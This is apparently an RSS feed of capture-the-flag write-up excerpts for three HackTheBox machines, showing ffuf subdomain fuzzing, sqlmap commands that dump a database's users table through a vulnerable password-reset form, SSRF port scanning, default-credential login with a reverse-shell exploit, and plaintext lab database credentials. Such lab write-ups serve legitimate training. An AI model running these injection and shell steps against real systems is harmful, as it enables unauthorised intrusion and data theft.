channel.title: Linux on Prickly Phish writeups
channel.description: Recent content in Linux on Prickly Phish writeups

item.title: MonitorsThree
item.description: monitorsthree # User # sudo bash -c "echo '10.10.11.30 monitorsthree.htb'>> /etc/hosts" Can’t see anything of interest off the bat lets do some enumeration ffuf -u http://monitorsthree.htb -H "Host:FUZZ.monitorsthree.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac Found the app login section The password recovery section was vulnerable to sql injection sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --dbs sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db --tables sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -columns sqlmap -u monitorsthree.

item.title: Editorial
item.description: User # sudo bash -c "echo '10.10.11.20 editorial.htb' >> /etc/hosts " Here i’m testing for ssrf I’m getting all numbers from 1 - 65536 in a wordlist for the local ports I saved the reqeust i got from burp into a .txt file to use with ffuf I started running ffuf but I was getting a whole load of 200s so I added “-fs 61” which filters out any which the size is 61

item.title: Boardlight
item.description: Boardlight # User # FFuF was doing this so i added -c -fs 15949 ffuf -u http://board.htb -H "Host:FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -fs 15949 found a poc for authenticated rev shell so had to get in Googled default creds which were admin/admin and it worked made a test page with a rev and ran it got foothold now onto priv esc db name = dolibarr db username = dolibarrowner db password = serverfun2$2023!
